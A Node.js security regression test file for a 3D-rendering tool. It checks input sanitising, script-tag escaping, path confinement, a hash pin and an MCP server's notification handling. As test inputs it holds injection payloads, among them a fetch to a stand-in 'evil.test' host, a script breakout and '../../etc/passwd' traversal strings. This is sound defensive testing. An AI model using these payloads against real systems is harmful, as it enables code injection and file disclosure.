
// Security regression tests for the render-3d skill.
// Run: node --test "test/security.test.mjs"
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, readdir } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { readFile } from "node:fs/promises";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");

const chrome = await import(join(ROOT, "lib/chrome.mjs"));
const { resolveConfined } = await import(join(ROOT, "lib/render.mjs"));

test("sanitizeDim neutralizes JS-injection payloads in dimensions", () => {
  // H1: a string payload that would break out of setSize(...) in the harness
  assert.equal(chrome.sanitizeDim("1});fetch('https://evil.test');//", 1280), 16);
  assert.equal(chrome.sanitizeDim("abc", 1280), 1280); // non-numeric -> fallback
  assert.equal(chrome.sanitizeDim(999999, 1280), 4096); // clamped to max
  assert.equal(chrome.sanitizeDim(-50, 1280), 16); // clamped to min
  assert.equal(chrome.sanitizeDim(640, 1280), 640); // legit value passes
  assert.equal(chrome.sanitizeDim("640", 1280), 640); // numeric string coerced
});

test("buildHarness keeps </script> breakouts inert", () => {
  const evil = `import * as THREE from 'three';
export const scene = new THREE.Scene();
export const camera = new THREE.PerspectiveCamera();
const x = "</scr" + "ipt><script>alert('pwned')</script>";`;
  const html = chrome.buildHarness(evil, {
    threeDataUrl: "data:text/javascript;base64,AAA",
    addonsUrl: "https://cdn.example/addons/",
    width: 640,
    height: 400,
  });
  // User code travels as base64: the raw evil string (including its literal
  // "</script>") must not appear anywhere in the HTML.
  assert.ok(!html.includes(evil));
  assert.ok(!html.includes("alert('pwned')"));
  // Exactly two real </script> closers: importmap + module.
  const closers = html.match(/<\/script/gi) || [];
  assert.equal(closers.length, 2);
  // And the base64 payload round-trips to the exact code.
  const b64 = html.match(/atob\("([A-Za-z0-9+/=]+)"\)/)[1];
  assert.equal(Buffer.from(b64, "base64").toString("utf8"), evil);
});

test("buildHarness sanitizes hostile dimensions too (defense in depth)", () => {
  const html = chrome.buildHarness("export const scene=1;export const camera=2;", {
    threeDataUrl: "data:text/javascript;base64,AAA",
    addonsUrl: "/a/",
    width: "1});alert(1);//",
    height: 999999,
  });
  assert.ok(html.includes("renderer.setSize(16, 4096)"));
});

test("resolveConfined blocks path traversal", () => {
  const base = join(tmpdir(), "r3d-base-test");
  assert.throws(() => resolveConfined(base, "../../etc/passwd"), /escapes/);
  assert.throws(() => resolveConfined(base, "/etc/passwd"), /escapes/);
  assert.throws(() => resolveConfined(base, ".."), /escapes/);
  assert.equal(resolveConfined(base, "sub/dir"), join(resolve(base), "sub/dir"));
  assert.equal(resolveConfined(base, "."), resolve(base));
});

test("assertCodeSize rejects oversized code", () => {
  assert.throws(
    () => chrome.assertCodeSize("x".repeat(chrome.MAX_CODE_BYTES + 1)),
    /too large/
  );
  chrome.assertCodeSize("x".repeat(100)); // fine
});

test("cached three.js matches the pinned SHA-512", async () => {
  const threePath = await chrome.ensureThreeJs();
  const digest = createHash("sha512").update(await readFile(threePath)).digest("hex");
  assert.equal(digest, chrome.THREE_SHA512);
});

test("MCP server ignores notification-form tools/call (no side effects)", async () => {
  const serverPath = join(ROOT, "mcp-server/server.mjs");
  const outBase = await mkdtemp(join(tmpdir(), "r3d-notif-"));
  const child = spawn(process.execPath, [serverPath], {
    env: {
      ...process.env,
      RENDER_3D_BACKEND: "stub",
      RENDER_3D_OUT_BASE: outBase,
    },
    stdio: ["pipe", "pipe", "inherit"],
  });
  const responses = [];
  let buf = "";
  child.stdout.on("data", (d) => {
    buf += d.toString();
    let nl;
    while ((nl = buf.indexOf("\n")) >= 0) {
      const line = buf.slice(0, nl).trim();
      buf = buf.slice(nl + 1);
      if (!line) continue;
      try { responses.push(JSON.parse(line)); } catch { /* ignore */ }
    }
  });
  const send = (msg) => child.stdin.write(JSON.stringify(msg) + "\n");
  try {
    // Notification: no id -> must NOT execute the tool.
    send({ jsonrpc: "2.0", method: "tools/call", params: { name: "render-scene", arguments: { prompt: "should never run" } } });
    // Give it a moment: if the bug were present, the stub render + chrome
    // preview would start writing into outBase.
    await new Promise((r) => setTimeout(r, 2500));
    const entries = await readdir(outBase);
    assert.deepEqual(entries, [], "notification-form tools/call executed a render");
    assert.ok(!responses.some((m) => m.id === undefined), "server replied to a notification");
    // Sanity: real requests still work.
    send({ jsonrpc: "2.0", id: 9, method: "ping" });
    const start = Date.now();
    while (!responses.some((m) => m.id === 9)) {
      if (Date.now() - start > 10000) throw new Error("no pong");
      await new Promise((r) => setTimeout(r, 100));
    }
  } finally {
    child.kill("SIGKILL");
  }
}, { timeout: 30000 });
